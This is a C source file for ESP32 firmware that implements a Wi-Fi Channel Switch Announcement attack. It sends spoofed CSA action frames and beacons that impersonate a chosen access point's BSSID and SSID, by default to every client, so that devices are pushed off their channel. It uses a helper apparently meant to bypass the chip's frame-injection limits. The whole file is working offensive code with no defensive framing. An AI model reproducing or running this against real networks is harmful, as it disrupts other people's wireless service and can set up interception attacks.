#include "attack_csa.h"

#include <string.h>

#include "esp_log.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include "freertos/task.h"

#include "wifi_ie_parser.h"
#include "wifi_radio_claim.h"
#include "wsl_bypasser.h"
#include "wifi_controller.h"

static const char *TAG = "csa";

static SemaphoreHandle_t s_mutex;
static bool s_running;
static attack_csa_config_t s_cfg;
static uint32_t s_tx_ok;
static uint32_t s_tx_fail;
static TaskHandle_t s_task;
static esp_timer_handle_t s_timeout_timer;

static void ensure_mutex(void)
{
    if (s_mutex == NULL) {
        s_mutex = xSemaphoreCreateMutex();
    }
}

static void timeout_cb(void *arg)
{
    (void)arg;
    ESP_LOGW(TAG, "CSA timeout");
    attack_csa_stop();
}

static void csa_task(void *arg)
{
    (void)arg;
    uint8_t dest[6];
    memcpy(dest, s_cfg.dest_mac, 6);
    if (wifi_mac_is_zero(dest)) {
        memset(dest, 0xFF, 6);
    }

    while (s_running) {
        bool ok_any = false;
        if (s_cfg.use_action) {
            if (wsl_bypasser_send_csa_action(s_cfg.target.bssid, dest,
                                             s_cfg.new_channel, s_cfg.count, s_cfg.mode)) {
                ok_any = true;
            }
        }
        if (s_cfg.use_beacon) {
            if (wsl_bypasser_send_csa_beacon(s_cfg.target.bssid, s_cfg.target.ssid,
                                             (uint8_t)strlen((char *)s_cfg.target.ssid),
                                             s_cfg.target.primary, s_cfg.new_channel,
                                             s_cfg.count, s_cfg.mode)) {
                ok_any = true;
            }
        }
        if (xSemaphoreTake(s_mutex, pdMS_TO_TICKS(20)) == pdTRUE) {
            if (ok_any) {
                s_tx_ok++;
            } else {
                s_tx_fail++;
            }
            xSemaphoreGive(s_mutex);
        }
        vTaskDelay(pdMS_TO_TICKS(s_cfg.interval_ms ? s_cfg.interval_ms : 50));
    }
    s_task = NULL;
    vTaskDelete(NULL);
}

void attack_csa_init(void)
{
    ensure_mutex();
    memset(&s_cfg, 0, sizeof(s_cfg));
    ESP_LOGI(TAG, "CSA module initialized");
}

esp_err_t attack_csa_start(const attack_csa_config_t *cfg)
{
    ensure_mutex();
    if (s_running || cfg == NULL) {
        return ESP_ERR_INVALID_STATE;
    }
    if (cfg->target.primary < 1 || cfg->target.primary > 14) {
        return ESP_ERR_INVALID_ARG;
    }
    if (cfg->new_channel < 1 || cfg->new_channel > 14) {
        return ESP_ERR_INVALID_ARG;
    }

    esp_err_t err = wifi_radio_claim(WIFI_RADIO_OWNER_CSA);
    if (err != ESP_OK) {
        return err;
    }

    memcpy(&s_cfg, cfg, sizeof(s_cfg));
    if (!s_cfg.use_action && !s_cfg.use_beacon) {
        s_cfg.use_action = true;
        s_cfg.use_beacon = true;
    }
    if (s_cfg.interval_ms < 20) {
        s_cfg.interval_ms = 50;
    }
    if (s_cfg.interval_ms > 2000) {
        s_cfg.interval_ms = 2000;
    }
    if (s_cfg.timeout_sec == 0) {
        s_cfg.timeout_sec = CSA_TIMEOUT_SEC;
    }
    if (s_cfg.timeout_sec > 300) {
        s_cfg.timeout_sec = 300;
    }
    if (wifi_mac_is_zero(s_cfg.dest_mac)) {
        memset(s_cfg.dest_mac, 0xFF, 6);
    }

    s_tx_ok = 0;
    s_tx_fail = 0;

    wifictl_set_channel(s_cfg.target.primary);
    /* Keep promiscuous off — TX-only module */
    esp_wifi_set_promiscuous(false);

    s_running = true;
    xTaskCreatePinnedToCore(csa_task, "csa_tx", 3072, NULL, 4, &s_task, 1);

    const esp_timer_create_args_t targs = {
        .callback = &timeout_cb,
        .name = "csa_timeout"
    };
    if (s_timeout_timer == NULL) {
        esp_timer_create(&targs, &s_timeout_timer);
    }
    esp_timer_start_once(s_timeout_timer, (uint64_t)s_cfg.timeout_sec * 1000000ULL);

    ESP_LOGI(TAG, "CSA start SSID=%s ch=%u -> %u",
             (char *)s_cfg.target.ssid, s_cfg.target.primary, s_cfg.new_channel);
    return ESP_OK;
}

void attack_csa_stop(void)
{
    if (!s_running) {
        return;
    }
    s_running = false;

    if (s_timeout_timer) {
        if (esp_timer_is_active(s_timeout_timer)) {
            esp_timer_stop(s_timeout_timer);
        }
        esp_timer_delete(s_timeout_timer);
        s_timeout_timer = NULL;
    }

    vTaskDelay(pdMS_TO_TICKS(100));
    if (s_task) {
        vTaskDelete(s_task);
        s_task = NULL;
    }

    wifi_radio_release(WIFI_RADIO_OWNER_CSA);
    ESP_LOGI(TAG, "CSA stopped ok=%u fail=%u", (unsigned)s_tx_ok, (unsigned)s_tx_fail);
}

bool attack_csa_is_running(void)
{
    return s_running;
}

cJSON *attack_csa_get_status_json(void)
{
    cJSON *root = cJSON_CreateObject();
    if (!root) {
        return NULL;
    }
    ensure_mutex();
    xSemaphoreTake(s_mutex, portMAX_DELAY);
    char bssid[18], dest[18];
    wifi_mac_to_str(s_cfg.target.bssid, bssid);
    wifi_mac_to_str(s_cfg.dest_mac, dest);
    cJSON_AddBoolToObject(root, "running", s_running);
    cJSON_AddStringToObject(root, "ssid", (char *)s_cfg.target.ssid);
    cJSON_AddStringToObject(root, "bssid", bssid);
    cJSON_AddStringToObject(root, "dest", dest);
    cJSON_AddNumberToObject(root, "channel", s_cfg.target.primary);
    cJSON_AddNumberToObject(root, "new_channel", s_cfg.new_channel);
    cJSON_AddNumberToObject(root, "count", s_cfg.count);
    cJSON_AddNumberToObject(root, "mode", s_cfg.mode);
    cJSON_AddBoolToObject(root, "use_action", s_cfg.use_action);
    cJSON_AddBoolToObject(root, "use_beacon", s_cfg.use_beacon);
    cJSON_AddNumberToObject(root, "tx_ok", s_tx_ok);
    cJSON_AddNumberToObject(root, "tx_fail", s_tx_fail);
    cJSON_AddNumberToObject(root, "timeout_sec", s_cfg.timeout_sec);
    cJSON_AddStringToObject(root, "status", s_running ? "Running" : "Stopped");
    xSemaphoreGive(s_mutex);
    return root;
}
